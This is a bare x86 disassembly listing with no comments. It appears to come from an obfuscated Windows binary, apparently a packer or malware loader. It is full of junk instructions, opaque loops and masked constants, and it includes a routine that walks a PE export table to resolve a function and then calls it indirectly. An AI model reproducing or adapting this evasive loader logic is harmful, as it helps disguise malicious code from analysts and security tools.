  4237c0:	mov    eax,DWORD PTR [eax]
  4237c2:	sub    DWORD PTR ds:0x42a3b1,0x42a2ed
  4237cc:	mov    cx,WORD PTR [ebp-0x4]
  4237d0:	movzx  ecx,cx
  4237d3:	xor    DWORD PTR ds:0x42a2e5,0x42a301
  4237dd:	add    ecx,DWORD PTR [eax]
  4237df:	mov    DWORD PTR [ebp-0x18],ecx
  4237e2:	mov    eax,DWORD PTR [ebp+0x8]
  4237e5:	mov    ecx,DWORD PTR [ebp-0x8]
  4237e8:	and    DWORD PTR ds:0x42a301,0x42a349
  4237f2:	xor    eax,esi
  4237f4:	add    DWORD PTR ds:0x42a3bd,0x42a3fd
  4237fe:	add    eax,edi
  423800:	cmp    DWORD PTR [ecx],eax
  423802:	mov    DWORD PTR ds:0x42a33d,0x719a
  42380c:	jne    0x4239c7
  423812:	mov    eax,DWORD PTR [ebp+0x8]
  423815:	adc    DWORD PTR ds:0x42a389,edx
  42381b:	mov    ecx,DWORD PTR [ebp-0x18]
  42381e:	xor    eax,esi
  423820:	sbb    DWORD PTR ds:0x42a3f1,0x5040
  42382a:	add    eax,edi
  42382c:	cmp    DWORD PTR [ecx],eax
  42382e:	mov    DWORD PTR ds:0x42a2e5,0x7a60
  423838:	jne    0x42396f
  42383e:	and    DWORD PTR ds:0x42a2f1,0x0
  423848:	jmp    0x42385b
  42384d:	xor    eax,eax
  42384f:	add    eax,DWORD PTR ds:0x42a2f1
  423855:	inc    eax
  423856:	mov    ds:0x42a2f1,eax
  42385b:	cmp    DWORD PTR ds:0x42a2f1,0x17
  423862:	jae    0x4238df
  423868:	cmp    DWORD PTR ds:0x42a2f1,0xb
  42386f:	jne    0x423883
  423875:	push   0x42a331
  42387a:	push   DWORD PTR [ebp-0x10]
  42387d:	call   DWORD PTR ds:0x425370
  423883:	cmp    DWORD PTR ds:0x42a2f1,0xa
  42388a:	jne    0x42389b
  423890:	mov    eax,ds:0x42a2f1
  423895:	inc    eax
  423896:	mov    ds:0x42a2f1,eax
  42389b:	jmp    0x42384d
  4238a0:	and    DWORD PTR ds:0x42a3c5,0x0
  4238aa:	mov    ecx,DWORD PTR ds:0x42a3c5
  4238b0:	inc    ecx
  4238b1:	mov    DWORD PTR ds:0x42a3c5,ecx
  4238b7:	cmp    DWORD PTR ds:0x42a3c5,0x27
  4238be:	jne    0x4238d2
  4238c4:	push   DWORD PTR [ebp-0x18]
  4238c7:	push   0x6019
  4238cc:	call   DWORD PTR ds:0x425038
  4238d2:	cmp    DWORD PTR ds:0x42a3c5,0x18
  4238d9:	jb     0x4238aa
  4238df:	mov    eax,DWORD PTR [ebp+0x8]
  4238e2:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e5:	or     edx,DWORD PTR ds:0x42a389
  4238eb:	xor    eax,esi
  4238ed:	xor    edx,DWORD PTR ds:0x42a381
  4238f3:	add    eax,edi
  4238f5:	sbb    DWORD PTR ds:0x42a385,0x509f
  4238ff:	mov    DWORD PTR [ecx],eax
  423901:	and    DWORD PTR ds:0x42a3fd,0x0
  42390b:	jmp    0x42391b
  423910:	mov    eax,ds:0x42a3fd
  423915:	inc    eax
  423916:	mov    ds:0x42a3fd,eax
  42391b:	cmp    DWORD PTR ds:0x42a3fd,0x10
  423922:	jae    0x42395e
  423928:	cmp    DWORD PTR ds:0x42a3fd,0x8
  42392f:	jne    0x42393e
  423935:	push   DWORD PTR [ebp-0x28]
  423938:	call   DWORD PTR ds:0x42503c
  42393e:	cmp    DWORD PTR ds:0x42a3fd,0x7
  423945:	jne    0x423959
  42394b:	xor    eax,eax
  42394d:	or     eax,DWORD PTR ds:0x42a3fd
  423953:	inc    eax
  423954:	mov    ds:0x42a3fd,eax
  423959:	jmp    0x423910
  42395e:	mov    eax,DWORD PTR [ebp-0x10]
  423961:	mov    ecx,DWORD PTR [ebp+0x10]
  423964:	xor    ecx,esi
  423966:	mov    edx,0xffcd8d68
  42396b:	sub    edx,ecx
  42396d:	add    DWORD PTR [eax],edx
  42396f:	mov    eax,ds:0x426bb6
  423974:	mov    eax,DWORD PTR [eax]
  423976:	mov    cx,WORD PTR [ebp-0x4]
  42397a:	movzx  ecx,cx
  42397d:	add    ecx,DWORD PTR [eax]
  42397f:	mov    DWORD PTR [ebp-0x18],ecx
  423982:	mov    eax,DWORD PTR [ebp+0xc]
  423985:	mov    ecx,DWORD PTR [ebp+0xc]
  423988:	xor    eax,esi
  42398a:	lea    eax,[eax+eax*1+0x327298]
  423991:	xor    ecx,esi
  423993:	sub    ecx,eax
  423995:	mov    ax,WORD PTR [ebp-0x4]
  423999:	movzx  eax,ax
  42399c:	cmp    eax,ecx
  42399e:	mov    eax,DWORD PTR [ebp+0x10]
  4239a1:	movzx  ecx,WORD PTR [ebp-0x4]
  4239a5:	jg     0x4239ba
  4239ab:	xor    eax,esi
  4239ad:	sub    ecx,eax
  4239af:	sub    ecx,edi
  4239b1:	mov    WORD PTR [ebp-0x4],cx
  4239b5:	jmp    0x4239c7
  4239ba:	xor    eax,esi
  4239bc:	lea    eax,[eax+ecx*1+0x327298]
  4239c3:	mov    WORD PTR [ebp-0x4],ax
  4239c7:	mov    eax,DWORD PTR [ebp-0xc]
  4239ca:	cmp    eax,ebx
  4239cc:	je     0x4239e0
  4239d2:	mov    eax,DWORD PTR [ebp-0x8]
  4239d5:	mov    DWORD PTR [eax],0x60341eb0
  4239db:	jmp    0x423a87
  4239e0:	mov    eax,DWORD PTR [ebp+0x8]
  4239e3:	mov    ecx,DWORD PTR [ebp-0x8]
  4239e6:	xor    eax,esi
  4239e8:	add    eax,edi
  4239ea:	cmp    DWORD PTR [ecx],eax
  4239ec:	je     0x423a6f
  4239f2:	mov    ecx,DWORD PTR [ebp-0x14]
  4239f5:	mov    eax,DWORD PTR [ebp-0x8]
  4239f8:	mov    eax,DWORD PTR [eax]
  4239fa:	mov    eax,DWORD PTR [eax+0x3c]
  4239fd:	lea    ecx,[ecx*8+0x78]
  423a04:	add    eax,ecx
  423a06:	mov    ecx,DWORD PTR [ebp-0x8]
  423a09:	mov    ecx,DWORD PTR [ecx]
  423a0b:	mov    eax,DWORD PTR [eax+ecx*1]
  423a0e:	mov    DWORD PTR [ebp-0x1c],eax
  423a11:	mov    eax,DWORD PTR [ebp+0x8]
  423a14:	xor    eax,esi
  423a16:	add    eax,edi
  423a18:	mov    DWORD PTR [ebp-0x20],eax
  423a1b:	mov    eax,DWORD PTR [ebp+0x8]
  423a1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  423a21:	xor    eax,esi
  423a23:	add    eax,edi
  423a25:	cmp    ecx,eax
  423a27:	je     0x423a87
  423a2d:	mov    eax,DWORD PTR [ebp-0x8]
  423a30:	mov    ecx,DWORD PTR [ebp-0x1c]
  423a33:	add    ecx,DWORD PTR [eax]
  423a35:	mov    DWORD PTR [ebp-0x20],ecx
  423a38:	mov    eax,DWORD PTR [ebp-0x20]
  423a3b:	mov    ecx,DWORD PTR [ebp-0x8]
  423a3e:	mov    eax,DWORD PTR [eax+0xc]
  423a41:	mov    ecx,DWORD PTR [ecx]
  423a43:	mov    al,BYTE PTR [eax+ecx*1]
  423a46:	add    al,0x3b
  423a48:	xor    al,0x43
  423a4a:	cmp    al,0xc5
  423a4c:	je     0x423a63
  423a52:	mov    eax,DWORD PTR [ebp+0x8]
  423a55:	mov    ecx,DWORD PTR [ebp-0x8]
  423a58:	xor    eax,esi
  423a5a:	add    eax,edi
  423a5c:	mov    DWORD PTR [ecx],eax
  423a5e:	jmp    0x423a87
  423a63:	xor    DWORD PTR [ebp-0xc],0x5fd8e
  423a6a:	jmp    0x423a87
  423a6f:	mov    eax,DWORD PTR [ebp-0x8]
  423a72:	mov    ecx,DWORD PTR [ebp-0x18]
  423a75:	mov    ecx,DWORD PTR [ecx]
  423a77:	mov    DWORD PTR [eax],ecx
  423a79:	mov    eax,DWORD PTR [ebp+0xc]
  423a7c:	mov    eax,DWORD PTR [ebp+0x8]
  423a7f:	push   DWORD PTR [ebp-0x8]
  423a82:	call   0x4231da
  423a87:	mov    eax,DWORD PTR [ebp-0xc]
  423a8a:	cmp    eax,ebx
  423a8c:	je     0x4237e2
  423a92:	mov    eax,DWORD PTR [ebp-0x8]
  423a95:	mov    eax,DWORD PTR [eax]
  423a97:	pop    edi
  423a98:	pop    esi
  423a99:	pop    ebx
  423a9a:	leave  
  423a9b:	ret    0xc
  423a9e:	push   ebp
  423a9f:	mov    ebp,esp
  423aa1:	sub    esp,0x30
  423aa4:	and    eax,DWORD PTR ds:0x42a335
  423aaa:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  423ab1:	and    DWORD PTR ds:0x42a389,0x0
  423abb:	jmp    0x423acb
  423ac0:	mov    eax,ds:0x42a389
  423ac5:	inc    eax
  423ac6:	mov    ds:0x42a389,eax
  423acb:	cmp    DWORD PTR ds:0x42a389,0x13
  423ad2:	jae    0x423b75
  423ad8:	cmp    DWORD PTR ds:0x42a389,0x8
  423adf:	jne    0x423afb
  423ae5:	push   0x0
  423ae7:	push   0x14f3
  423aec:	push   DWORD PTR [ebp-0x1c]
  423aef:	push   DWORD PTR [ebp-0x10]
  423af2:	push   DWORD PTR [ebp-0x1c]
  423af5:	call   DWORD PTR ds:0x425200
  423afb:	cmp    DWORD PTR ds:0x42a389,0x7
  423b02:	jne    0x423b13
  423b08:	mov    eax,ds:0x42a389
  423b0d:	inc    eax
  423b0e:	mov    ds:0x42a389,eax
  423b13:	jmp    0x423ac0
  423b18:	mov    DWORD PTR ds:0x42a381,0x1e
  423b22:	cmp    DWORD PTR ds:0x42a381,0x0
  423b29:	je     0x423b75
  423b2f:	cmp    DWORD PTR ds:0x42a381,0x8
  423b36:	jne    0x423b4a
  423b3c:	push   DWORD PTR [ebp-0x18]
  423b3f:	push   0x0
  423b41:	push   DWORD PTR [ebp-0x10]
  423b44:	call   DWORD PTR ds:0x425374
  423b4a:	cmp    DWORD PTR ds:0x42a381,0x9
  423b51:	jne    0x423b62
  423b57:	mov    eax,ds:0x42a381
  423b5c:	dec    eax
  423b5d:	mov    ds:0x42a381,eax
  423b62:	xor    eax,eax
  423b64:	xor    eax,DWORD PTR ds:0x42a381
  423b6a:	dec    eax
  423b6b:	mov    ds:0x42a381,eax
  423b70:	jmp    0x423b22
  423b75:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  423b7c:	mov    ecx,DWORD PTR [ebp-0x4]
  423b7f:	sub    eax,0x7c5
  423b84:	push   ebx
  423b85:	xor    eax,eax
  423b87:	or     eax,DWORD PTR ds:0x42a2e5
  423b8d:	adc    DWORD PTR ds:0x42a335,eax
  423b93:	mov    eax,0x7510850
  423b98:	and    DWORD PTR ds:0x42a389,0x0
  423ba2:	jmp    0x423bb4
  423ba7:	mov    ebx,DWORD PTR ds:0x42a389
  423bad:	inc    ebx
  423bae:	mov    DWORD PTR ds:0x42a389,ebx
  423bb4:	cmp    DWORD PTR ds:0x42a389,0x16
  423bbb:	jae    0x423c3c
  423bc1:	cmp    DWORD PTR ds:0x42a389,0xe
  423bc8:	jne    0x423bd7
  423bce:	push   DWORD PTR [ebp-0x18]
  423bd1:	call   DWORD PTR ds:0x425040
  423bd7:	cmp    DWORD PTR ds:0x42a389,0xd
  423bde:	jne    0x423bf1
  423be4:	mov    ebx,DWORD PTR ds:0x42a389
  423bea:	inc    ebx
  423beb:	mov    DWORD PTR ds:0x42a389,ebx
  423bf1:	jmp    0x423ba7
  423bf6:	mov    DWORD PTR ds:0x42a401,0x1d
  423c00:	cmp    DWORD PTR ds:0x42a401,0x0
  423c07:	je     0x423c3c
  423c0d:	cmp    DWORD PTR ds:0x42a401,0x2c
  423c14:	jne    0x423c2a
  423c1a:	push   0x1552
  423c1f:	push   0x42a4e6
  423c24:	call   DWORD PTR ds:0x425044
  423c2a:	mov    ebx,DWORD PTR ds:0x42a401
  423c30:	dec    ebx
  423c31:	mov    DWORD PTR ds:0x42a401,ebx
  423c37:	jmp    0x423c00
  423c3c:	xor    ecx,eax
  423c3e:	and    DWORD PTR ds:0x42a3f1,0x0
  423c48:	jmp    0x423c5a
  423c4d:	mov    ebx,DWORD PTR ds:0x42a3f1
  423c53:	inc    ebx
  423c54:	mov    DWORD PTR ds:0x42a3f1,ebx
  423c5a:	cmp    DWORD PTR ds:0x42a3f1,0x17
  423c61:	jae    0x423c88
  423c67:	cmp    DWORD PTR ds:0x42a3f1,0x27
  423c6e:	jne    0x423c7d
  423c74:	push   DWORD PTR [ebp-0xc]
  423c77:	call   DWORD PTR ds:0x425378
  423c7d:	jmp    0x423c4d
  423c82:	or     ebx,DWORD PTR ds:0x42a3c1
  423c88:	mov    ebx,0x327298
  423c8d:	adc    DWORD PTR ds:0x42a3cd,0x42a371
  423c97:	add    ecx,ebx
  423c99:	mov    DWORD PTR ds:0x42a409,0x58ad
  423ca3:	mov    DWORD PTR [ebp-0x1c],ecx
  423ca6:	and    DWORD PTR ds:0x42a2dd,ebx
  423cac:	mov    ecx,DWORD PTR [ebp+0x14]
  423caf:	push   esi
  423cb0:	push   edi
  423cb1:	sbb    DWORD PTR ds:0x42a339,0x49a0
  423cbb:	test   ecx,ecx
  423cbd:	je     0x423cd7
  423cc3:	adc    DWORD PTR ds:0x42a2dd,0x603
  423ccd:	mov    ecx,DWORD PTR [ebp+0x14]
  423cd0:	mov    ecx,DWORD PTR [ecx]
  423cd2:	sub    edi,esi
  423cd4:	mov    DWORD PTR [ebp-0x1c],ecx
  423cd7:	and    DWORD PTR ds:0x42a3b5,0x0
  423ce1:	mov    ecx,DWORD PTR ds:0x42a3b5
  423ce7:	inc    ecx
  423ce8:	mov    DWORD PTR ds:0x42a3b5,ecx
  423cee:	cmp    DWORD PTR ds:0x42a3b5,0x24
  423cf5:	jne    0x423d0b
  423cfb:	push   0x575c
  423d00:	push   0x61f5
  423d05:	call   DWORD PTR ds:0x42537c
  423d0b:	cmp    DWORD PTR ds:0x42a3b5,0x18
  423d12:	jb     0x423ce1
  423d18:	imul   edx,eax
  423d1b:	mov    ecx,0x4573
  423d20:	sub    DWORD PTR ds:0x42a341,0x7410
  423d2a:	add    edx,ecx
  423d2c:	sub    esi,esi
  423d2e:	mov    esi,0x7879
  423d33:	xor    DWORD PTR ds:0x42a2f5,0x42a2f1
  423d3d:	mov    edi,0x1556
  423d42:	xchg   esi,ecx
  423d44:	sub    ecx,DWORD PTR ds:0x42a38d
  423d4a:	sub    edx,edi
  423d4c:	xor    esi,esi
  423d4e:	add    ecx,0x38ee
  423d54:	mov    DWORD PTR [ebp-0x28],esi
  423d57:	mov    DWORD PTR [ebp-0x2c],esi
  423d5a:	mov    DWORD PTR [ebp-0x14],esi
  423d5d:	xor    DWORD PTR ds:0x42a371,0x1187
  423d67:	mov    DWORD PTR [ebp-0x8],esi
  423d6a:	mov    ecx,DWORD PTR [ebp-0x18]
  423d6d:	sub    DWORD PTR ds:0x42a2f9,0x42a3c1
  423d77:	xor    ecx,eax
  423d79:	xor    edi,edi
  423d7b:	add    DWORD PTR ds:0x42a2f5,0x42a341
  423d85:	add    ecx,ebx
  423d87:	mov    eax,ds:0x42a405
  423d8c:	mov    DWORD PTR [ebp-0x20],ecx
  423d8f:	mov    eax,DWORD PTR [ebp-0x20]
  423d92:	je     0x423fe1
  423d98:	mov    eax,DWORD PTR [ebp-0x4]
  423d9b:	xor    eax,0x7510850
  423da0:	add    eax,ebx
  423da2:	cmp    edi,eax
  423da4:	mov    DWORD PTR ds:0x42a401,0x1204
  423dae:	jne    0x423f84
  423db4:	push   DWORD PTR [ebp+0x8]
  423db7:	call   0x424b8a
  423dbc:	and    DWORD PTR ds:0x42a3fd,0x0
  423dc6:	jmp    0x423dd8
  423dcb:	mov    esi,DWORD PTR ds:0x42a3fd
  423dd1:	inc    esi
  423dd2:	mov    DWORD PTR ds:0x42a3fd,esi
  423dd8:	cmp    DWORD PTR ds:0x42a3fd,0x1c
  423ddf:	jae    0x423e1c
  423de5:	cmp    DWORD PTR ds:0x42a3fd,0x7
  423dec:	jne    0x423dfd
  423df2:	push   0x4aee
  423df7:	call   DWORD PTR ds:0x425048
  423dfd:	cmp    DWORD PTR ds:0x42a3fd,0x6
  423e04:	jne    0x423e17
  423e0a:	mov    esi,DWORD PTR ds:0x42a3fd
  423e10:	inc    esi
  423e11:	mov    DWORD PTR ds:0x42a3fd,esi
  423e17:	jmp    0x423dcb
  423e1c:	mov    DWORD PTR [ebp-0x20],eax
  423e1f:	mov    eax,DWORD PTR [ebp-0x4]
  423e22:	xor    DWORD PTR ds:0x42a2e1,0x1ce4
  423e2c:	mov    ecx,DWORD PTR [ebp-0x20]
  423e2f:	mov    DWORD PTR ds:0x42a339,0x17
  423e39:	cmp    DWORD PTR ds:0x42a339,0x0
  423e40:	je     0x423e8a
  423e46:	cmp    DWORD PTR ds:0x42a339,0xb
  423e4d:	jne    0x423e5e
  423e53:	push   0x1
  423e55:	push   DWORD PTR [ebp-0x1c]
  423e58:	call   DWORD PTR ds:0x425204
  423e5e:	cmp    DWORD PTR ds:0x42a339,0xc
  423e65:	jne    0x423e78
  423e6b:	mov    esi,DWORD PTR ds:0x42a339
  423e71:	dec    esi
  423e72:	mov    DWORD PTR ds:0x42a339,esi
  423e78:	mov    esi,DWORD PTR ds:0x42a339
  423e7e:	dec    esi
  423e7f:	mov    DWORD PTR ds:0x42a339,esi
  423e85:	jmp    0x423e39
  423e8a:	mov    esi,0x7510850
  423e8f:	xor    eax,esi
  423e91:	add    eax,ebx
  423e93:	cmp    ecx,eax
  423e95:	je     0x423fc5
  423e9b:	push   DWORD PTR [ebp-0x20]
  423e9e:	push   DWORD PTR [ebp+0x8]
  423ea1:	add    DWORD PTR ds:0x42a33d,0x74d7
  423eab:	call   0x424579
  423eb0:	movzx  ecx,WORD PTR ds:0x42a3f5
  423eb7:	sbb    ecx,DWORD PTR ds:0x42a2e9
  423ebd:	mov    DWORD PTR ds:0x42a3f5,ecx
  423ec3:	mov    DWORD PTR [ebp-0x14],eax
  423ec6:	mov    eax,DWORD PTR [ebp-0x4]
  423ec9:	and    DWORD PTR ds:0x42a349,0x0
  423ed3:	mov    ecx,DWORD PTR ds:0x42a349
  423ed9:	inc    ecx
  423eda:	mov    DWORD PTR ds:0x42a349,ecx
  423ee0:	cmp    DWORD PTR ds:0x42a349,0x16
  423ee7:	jne    0x423ef8
  423eed:	push   0x42a663
  423ef2:	call   DWORD PTR ds:0x425208
  423ef8:	cmp    DWORD PTR ds:0x42a349,0x12
  423eff:	jb     0x423ed3
  423f05:	mov    DWORD PTR ds:0x42a3c1,0x1f
  423f0f:	cmp    DWORD PTR ds:0x42a3c1,0x0
  423f16:	je     0x423f46
  423f1c:	cmp    DWORD PTR ds:0x42a3c1,0x26
  423f23:	jne    0x423f32
  423f29:	push   DWORD PTR [ebp-0x14]
  423f2c:	call   DWORD PTR ds:0x425380
  423f32:	xor    ecx,ecx
  423f34:	add    ecx,DWORD PTR ds:0x42a3c1
  423f3a:	dec    ecx
  423f3b:	mov    DWORD PTR ds:0x42a3c1,ecx
  423f41:	jmp    0x423f0f
  423f46:	mov    ecx,DWORD PTR [ebp-0x14]
  423f49:	xor    eax,esi
  423f4b:	add    eax,ebx
  423f4d:	cmp    ecx,eax
  423f4f:	je     0x423fc5
  423f55:	mov    eax,DWORD PTR [ebp-0x14]
  423f58:	mov    eax,DWORD PTR [eax+0x18]
  423f5b:	mov    DWORD PTR [ebp-0x20],eax
  423f5e:	mov    eax,DWORD PTR [ebp-0x14]
  423f61:	mov    ecx,DWORD PTR [ebp+0x8]
  423f64:	add    ecx,DWORD PTR [eax+0x20]
  423f67:	mov    DWORD PTR [ebp-0x28],ecx
  423f6a:	mov    eax,DWORD PTR [ebp-0x14]
  423f6d:	mov    ecx,DWORD PTR [ebp+0x8]
  423f70:	add    ecx,DWORD PTR [eax+0x24]
  423f73:	mov    DWORD PTR [ebp-0x2c],ecx
  423f76:	mov    eax,DWORD PTR [ebp-0x14]
  423f79:	mov    ecx,DWORD PTR [ebp+0x8]
  423f7c:	add    ecx,DWORD PTR [eax+0x1c]
  423f7f:	xor    esi,esi
  423f81:	mov    DWORD PTR [ebp-0x14],ecx
  423f84:	mov    eax,DWORD PTR [ebp-0x28]
  423f87:	mov    ecx,DWORD PTR [ebp+0x8]
  423f8a:	add    ecx,DWORD PTR [eax+edi*4]
  423f8d:	lea    eax,[ebp-0x8]
  423f90:	mov    DWORD PTR [ebp-0x30],ecx
  423f93:	push   eax
  423f94:	push   DWORD PTR [ebp-0x30]
  423f97:	push   DWORD PTR [ebp+0xc]
  423f9a:	call   0x424887
  423f9f:	mov    eax,DWORD PTR [ebp-0x4]
  423fa2:	mov    ecx,DWORD PTR [ebp-0x8]
  423fa5:	xor    eax,0x7510850
  423faa:	add    eax,ebx
  423fac:	cmp    ecx,eax
  423fae:	jne    0x423fd1
  423fb4:	mov    eax,DWORD PTR [ebp-0x20]
  423fb7:	inc    edi
  423fb8:	cmp    edi,eax
  423fba:	jb     0x423d98
  423fc0:	jmp    0x423fe1
  423fc5:	mov    eax,DWORD PTR [ebp-0x4]
  423fc8:	xor    eax,esi
  423fca:	add    eax,ebx
  423fcc:	jmp    0x42412f
  423fd1:	mov    eax,DWORD PTR [ebp-0x2c]
  423fd4:	movzx  eax,WORD PTR [eax+edi*2]
  423fd8:	mov    ecx,DWORD PTR [ebp-0x14]
  423fdb:	mov    eax,DWORD PTR [ecx+eax*4]
  423fde:	mov    DWORD PTR [ebp+0xc],eax
  423fe1:	mov    eax,DWORD PTR [ebp-0x4]
  423fe4:	mov    ecx,DWORD PTR [ebp-0x8]
  423fe7:	xor    eax,0x7510850
  423fec:	add    eax,ebx
  423fee:	cmp    ecx,eax
  423ff0:	jne    0x424003
  423ff6:	mov    eax,DWORD PTR [ebp-0x4]
  423ff9:	xor    eax,0x7510850
  423ffe:	jmp    0x423fca
  424003:	mov    eax,DWORD PTR [ebp+0xc]
  424006:	add    eax,DWORD PTR [ebp+0x8]
  424009:	mov    DWORD PTR [ebp-0x10],eax
  42400c:	mov    eax,DWORD PTR [ebp-0x1c]
  42400f:	test   eax,eax
  424011:	je     0x4240e1
  424017:	mov    DWORD PTR [ebp-0x24],esi
  42401a:	push   0xb
  42401c:	pop    ecx
  42401d:	push   0x5
  42401f:	dec    ecx
  424020:	pop    ebx
  424021:	xchg   ebx,ecx
  424023:	sub    ebx,ecx
  424025:	xchg   ebx,ecx
  424027:	dec    ecx
  424028:	mov    eax,DWORD PTR [ebp-0x1c]
  42402b:	imul   eax,ecx
  42402e:	sub    esp,eax
  424030:	mov    DWORD PTR [ebp-0x24],esp
  424033:	mov    eax,DWORD PTR [ebp-0x4]
  424036:	mov    ecx,0x7510850
  42403b:	xor    eax,ecx
  42403d:	mov    edx,0x327298
  424042:	add    eax,edx
  424044:	mov    DWORD PTR [ebp+0x8],eax
  424047:	mov    eax,DWORD PTR [ebp-0x18]
  42404a:	xor    eax,ecx
  42404c:	add    eax,edx
  42404e:	mov    edx,DWORD PTR [ebp+0x14]
  424051:	imul   eax,DWORD PTR [edx]
  424054:	mov    edx,DWORD PTR [ebp-0x4]
  424057:	xor    edx,ecx
  424059:	mov    ecx,DWORD PTR [ebp+0x8]
  42405c:	lea    ecx,[edx+ecx*1+0x327298]
  424063:	cmp    ecx,eax
  424065:	je     0x4240dc
  42406b:	mov    edi,DWORD PTR [ebp-0x18]
  42406e:	mov    eax,DWORD PTR [ebp+0x8]
  424071:	mov    edx,DWORD PTR [ebp+0x14]
  424074:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  424078:	mov    ecx,0x7510850
  42407d:	xor    edx,edx
  42407f:	xor    edi,ecx
  424081:	mov    esi,0x327298
  424086:	add    edi,esi
  424088:	div    edi
  42408a:	mov    edx,DWORD PTR [ebp-0x4]
  42408d:	xor    edx,ecx
  42408f:	lea    eax,[edx+eax*1+0x327298]
  424096:	mov    edx,DWORD PTR [ebp+0x8]
  424099:	mov    edi,DWORD PTR [ebp-0x24]
  42409c:	mov    DWORD PTR [edi+edx*4],eax
  42409f:	mov    eax,DWORD PTR [ebp-0x18]
  4240a2:	mov    edx,DWORD PTR [ebp+0x8]
  4240a5:	xor    eax,ecx
  4240a7:	lea    eax,[eax+edx*1+0x327298]
  4240ae:	mov    DWORD PTR [ebp+0x8],eax
  4240b1:	mov    eax,DWORD PTR [ebp-0x18]
  4240b4:	mov    edx,DWORD PTR [ebp+0x14]
  4240b7:	xor    eax,ecx
  4240b9:	add    eax,esi
  4240bb:	imul   eax,DWORD PTR [edx]
  4240be:	mov    edx,DWORD PTR [ebp-0x4]
  4240c1:	xor    edx,ecx
  4240c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4240c6:	lea    ecx,[edx+ecx*1+0x327298]
  4240cd:	cmp    ecx,eax
  4240cf:	jne    0x42406b
  4240d5:	mov    ebx,esi
  4240d7:	jmp    0x4240e1
  4240dc:	mov    ebx,0x327298
  4240e1:	mov    eax,DWORD PTR [ebp-0x4]
  4240e4:	xor    eax,0x7510850
  4240e9:	add    eax,ebx
  4240eb:	mov    DWORD PTR [ebp-0xc],eax
  4240ee:	xor    ebx,ebx
  4240f0:	lea    eax,[ebp-0x10]
  4240f3:	add    ebx,DWORD PTR [eax]
  4240f5:	call   ebx
  4240f7:	xor    ebx,ebx
  4240f9:	inc    ebx
  4240fa:	cmp    DWORD PTR [ebp+0x10],ebx
  4240fd:	je     0x42411b
  424103:	xchg   edx,eax
  424104:	push   0xa
  424106:	pop    ecx
  424107:	push   0x4
  424109:	pop    ebx
  42410a:	inc    ebx
  42410b:	xchg   ebx,ecx
  42410d:	sub    ebx,ecx
  42410f:	xchg   ebx,ecx
  424111:	dec    ecx
  424112:	mov    eax,DWORD PTR [ebp-0x1c]
  424115:	imul   eax,ecx
  424118:	add    esp,eax
  42411a:	xchg   edx,eax
  42411b:	push   eax
  42411c:	xor    ebx,ebx
  42411e:	mov    edx,esp
  424120:	dec    edx
  424121:	inc    ebx
  424122:	add    ebx,DWORD PTR [edx+ebx*1]
  424125:	dec    ebx
  424126:	xor    edx,edx
  424128:	add    DWORD PTR [ebp-0xc],ebx
  42412b:	pop    ebx
  42412c:	mov    eax,DWORD PTR [ebp-0xc]
  42412f:	pop    edi
  424130:	pop    esi
  424131:	pop    ebx
  424132:	leave  
  424133:	ret    0x10
  424136:	push   ebp
  424137:	mov    ebp,esp
  424139:	push   ecx
  42413a:	mov    DWORD PTR ds:0x42a371,0x1c54
  424144:	push   ecx
  424145:	mov    eax,0xf89c8539
  42414a:	not    DWORD PTR ds:0x42a301
  424150:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  424157:	push   esi
  424158:	mov    DWORD PTR ds:0x42a3cd,0x7f3d
  424162:	mov    DWORD PTR [ebp-0x8],eax
  424165:	mov    ecx,DWORD PTR [ebp+0x8]
  424168:	mov    DWORD PTR ds:0x42a389,0x16bb
  424172:	push   edi
  424173:	mov    edi,0x7510850
  424178:	movzx  esi,WORD PTR ds:0x42a37d
  42417f:	mov    esi,0x327298
  424184:	cmp    ecx,eax
  424186:	je     0x424271
  42418c:	mov    eax,ds:0x42a375
  424191:	or     eax,DWORD PTR ds:0x42a2d9
  424197:	mov    ds:0x42a375,eax
  42419c:	mov    eax,DWORD PTR [ebp-0x4]
  42419f:	add    ecx,DWORD PTR ds:0x42a375
  4241a5:	mov    ecx,DWORD PTR [ebp+0xc]
  4241a8:	and    DWORD PTR ds:0x42a405,0x42a301
  4241b2:	xor    eax,edi
  4241b4:	adc    DWORD PTR ds:0x42a3fd,0x42a401
  4241be:	add    eax,esi
  4241c0:	cmp    eax,ecx
  4241c2:	mov    DWORD PTR ds:0x42a335,0x34ec
  4241cc:	je     0x424271
  4241d2:	neg    edx
  4241d4:	mov    eax,DWORD PTR [ebp-0x4]
  4241d7:	xor    edx,0x6a0b
  4241dd:	xor    eax,edi
  4241df:	or     DWORD PTR ds:0x42a38d,ebx
  4241e5:	add    eax,esi
  4241e7:	mov    DWORD PTR ds:0x42a3b1,0x1e
  4241f1:	cmp    DWORD PTR ds:0x42a3b1,0x0
  4241f8:	je     0x424247
  4241fe:	cmp    DWORD PTR ds:0x42a3b1,0x4
  424205:	jne    0x42421b
  42420b:	push   0x7980
  424210:	push   0x42a46e
  424215:	call   DWORD PTR ds:0x42520c
  42421b:	cmp    DWORD PTR ds:0x42a3b1,0x5
  424222:	jne    0x424235
  424228:	mov    edx,DWORD PTR ds:0x42a3b1
  42422e:	dec    edx
  42422f:	mov    DWORD PTR ds:0x42a3b1,edx
  424235:	mov    edx,DWORD PTR ds:0x42a3b1
  42423b:	dec    edx
  42423c:	mov    DWORD PTR ds:0x42a3b1,edx
  424242:	jmp    0x4241f1
  424247:	push   eax
  424248:	neg    edx
  42424a:	push   DWORD PTR [ebp-0x8]
  42424d:	push   DWORD PTR [ebp-0x4]
  424250:	mov    edx,DWORD PTR ds:0x426ae2
  424256:	call   0x4229a1
  42425b:	mov    ecx,DWORD PTR ds:0x426ae2
  424261:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424267:	mov    DWORD PTR [ecx],eax
  424269:	mov    eax,DWORD PTR [ebp-0x8]
  42426c:	jmp    0x4242a9
  424271:	mov    eax,DWORD PTR [ebp-0x4]
  424274:	mov    ecx,DWORD PTR [ebp+0x10]
  424277:	xor    eax,edi
  424279:	add    eax,esi
  42427b:	cmp    eax,ecx
  42427d:	jne    0x4242a6
  424283:	mov    eax,DWORD PTR [ebp-0x4]
  424286:	xor    eax,edi
  424288:	add    eax,esi
  42428a:	mov    ds:0x426b66,eax
  42428f:	mov    eax,DWORD PTR [ebp-0x4]
  424292:	xor    eax,edi
  424294:	add    eax,esi
